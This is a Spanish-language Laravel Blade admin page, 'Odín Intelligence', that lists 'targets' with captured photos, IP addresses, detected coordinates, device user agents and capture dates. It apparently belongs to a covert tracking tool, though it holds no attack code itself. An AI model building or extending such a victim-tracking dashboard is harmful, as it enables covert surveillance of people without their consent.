<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Archivo Central - Odín Intelligence</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
    <link rel="stylesheet" href="https://cdn.datatables.net/1.13.5/css/dataTables.bootstrap4.min.css">
    
    <style>
        body { background-color: #0b0d0f; color: #e0e0e0; margin: 0; font-family: 'Courier New', monospace; }
        .odin-header { background: #121212; padding: 15px 25px; border-bottom: 2px solid #ff4136; position: sticky; top: 0; z-index: 1000; }
        .target-card { background: #1a1c1e; border: 1px solid #333; border-radius: 4px; margin: 20px; padding: 15px; }
        
        /* Estilos de la Tabla Odín */
        .table-odin { color: #dcdcdc !important; width: 100% !important; border-collapse: collapse !important; }
        .table-odin thead th { background: #25282b !important; color: #ff4136 !important; border-bottom: 2px solid #ff4136 !important; text-transform: uppercase; font-size: 0.75rem; letter-spacing: 1px; }
        .table-odin tbody tr { background: #1a1c1e !important; border-bottom: 1px solid #333; transition: 0.3s; }
        .table-odin tbody tr:hover { background: #25282b !important; }

        /* Contenedor de Imagen de Captura Local */
        .img-container { 
            width: 70px; 
            height: 70px; 
            background: #000; 
            border: 1px solid #ff4136; 
            overflow: hidden; 
            margin: 0 auto; 
            box-shadow: 0 0 10px rgba(255, 65, 54, 0.2);
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .img-box { width: 100%; height: 100%; object-fit: cover; cursor: pointer; transition: 0.4s; }
        .img-box:hover { transform: scale(1.2); filter: brightness(1.3); }
        
        .badge-ip { background: #ff4136; color: white; padding: 3px 8px; border-radius: 3px; font-weight: bold; font-family: monospace; }
        .text-coord { color: #00bcff; font-weight: bold; }

        /* DataTables Dark Mode */
        .dataTables_wrapper .dataTables_length, .dataTables_wrapper .dataTables_filter, 
        .dataTables_wrapper .dataTables_info, .dataTables_wrapper .dataTables_paginate {
            color: #aaa !important; font-size: 0.85rem; padding: 10px 0;
        }
        .dataTables_wrapper .dataTables_filter input { background: #0b0d0f; border: 1px solid #444; color: white; border-radius: 4px; padding: 5px; }
        .page-item.active .page-link { background-color: #ff4136 !important; border-color: #ff4136 !important; }
        .page-link { background-color: #1a1c1e !important; border-color: #333 !important; color: #ff4136 !important; }
    </style>
</head>
<body>

    <div class="odin-header d-flex justify-content-between align-items-center">
        <div>
            <h2 class="m-0 font-weight-bold" style="letter-spacing: 2px;">ARCHIVO CENTRAL</h2>
            <small class="text-danger"><i class="fas fa-hdd mr-1"></i> MODO: ALMACENAMIENTO LOCAL ACTIVO</small>
        </div>
        <div>
            <button onclick="cleanDatabase()" class="btn btn-outline-warning btn-sm mr-2 shadow-sm">
                <i class="fas fa-sync-alt mr-1"></i> REPARAR RUTAS
            </button>
            <a href="{{ route('odin.map') }}" class="btn btn-danger btn-sm mr-2 shadow-sm">
                <i class="fas fa-broadcast-tower mr-1"></i> RADAR TÁCTICO
            </a>
            <a href="{{ route('dashboard') }}" class="btn btn-outline-light btn-sm">
                <i class="fas fa-arrow-left mr-1"></i> SALIR
            </a>
        </div>
    </div>

    <div class="target-card shadow-lg">
        <table id="odinTable" class="table table-odin">
            <thead>
                <tr>
                    <th class="text-center">Evidencia</th>
                    <th>ID</th>
                    <th>Dirección IP</th>
                    <th>Coordenadas Detectadas</th>
                    <th>Sistema / Dispositivo</th>
                    <th>Fecha de Captura</th>
                    <th class="text-right">Acciones</th>
                </tr>
            </thead>
            <tbody>
                @foreach($targets as $target)
                <tr>
                    <td class="text-center">
                        <div class="img-container">
                            @if(!empty($target->photo_path))
                                @php
                                    // 1. Eliminamos cualquier prefijo antiguo (http, storage/, etc)
                                    $fileName = basename($target->photo_path);
                                    // 2. Construimos la URL local absoluta
                                    $finalUrl = asset('storage/captures/' . $fileName);
                                @endphp
                                
                                <img src="{{ $finalUrl }}" 
                                     class="img-box" 
                                     alt="Captura"
                                     loading="lazy"
                                     onerror="this.src='https://via.placeholder.com/150/000000/FF4136?text=ERROR+CARGA';"
                                     onclick="window.open('{{ $finalUrl }}', '_blank')">
                            @else
                                <div class="text-muted small">
                                    <i class="fas fa-user-secret fa-2x"></i><br>S/I
                                </div>
                            @endif
                        </div>
                    </td>

                    <td class="align-middle text-muted small">#{{ $target->id }}</td>
                    <td class="align-middle">
                        <span class="badge badge-ip shadow-sm">{{ $target->ip }}</span>
                    </td>
                    <td class="align-middle small">
                        <span class="text-coord"><i class="fas fa-crosshairs mr-1"></i> {{ $target->location }}</span>
                    </td>
                    <td class="align-middle small text-muted">
                        <i class="fas fa-laptop-code mr-1"></i> {{ Str::limit($target->user_agent, 45) }}
                    </td>
                    <td class="align-middle small">
                        <i class="far fa-clock mr-1"></i> {{ $target->created_at->format('d/m/Y H:i') }}
                    </td>
                    <td class="align-middle text-right">
                        <a href="{{ route('odin.show', $target->id) }}" class="btn btn-xs btn-outline-danger font-weight-bold">
                            VER EXPEDIENTE
                        </a>
                    </td>
                </tr>
                @endforeach
            </tbody>
        </table>
    </div>

    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/js/bootstrap.bundle.min.js"></script>
    <script src="https://cdn.datatables.net/1.13.5/js/jquery.dataTables.min.js"></script>
    <script src="https://cdn.datatables.net/1.13.5/js/dataTables.bootstrap4.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>

    <script>
        $(document).ready(function() {
            $('#odinTable').DataTable({
                "order": [[1, "desc"]],
                "pageLength": 10,
                "language": {
                    "url": "//cdn.datatables.net/plug-ins/1.13.5/i18n/es-ES.json"
                },
                "responsive": true,
                "drawCallback": function() {
                    $('.dataTables_paginate .paginate_button').addClass('btn-sm');
                }
            });
        });

        function cleanDatabase() {
            Swal.fire({
                title: 'REPARACIÓN DE ARCHIVOS',
                text: "Se normalizarán las rutas para asegurar la carga local de imágenes.",
                icon: 'info',
                showCancelButton: true,
                confirmButtonColor: '#ff4136',
                cancelButtonColor: '#333',
                confirmButtonText: 'Sincronizar',
                cancelButtonText: 'Cancelar',
                background: '#1a1c1e',
                color: '#fff'
            }).then((result) => {
                if (result.isConfirmed) {
                    fetch('/admin/clean-db')
                        .then(res => res.json())
                        .then(data => {
                            Swal.fire({
                                title: 'Sincronización Exitosa',
                                text: 'Registros normalizados: ' + data.registros_corregidos,
                                icon: 'success',
                                background: '#1a1c1e',
                                color: '#fff'
                            }).then(() => location.reload());
                        })
                        .catch(err => Swal.fire('Error de Red', 'No se pudo contactar con el servidor local.', 'error'));
                }
            });
        }
    </script>
</body>
</html>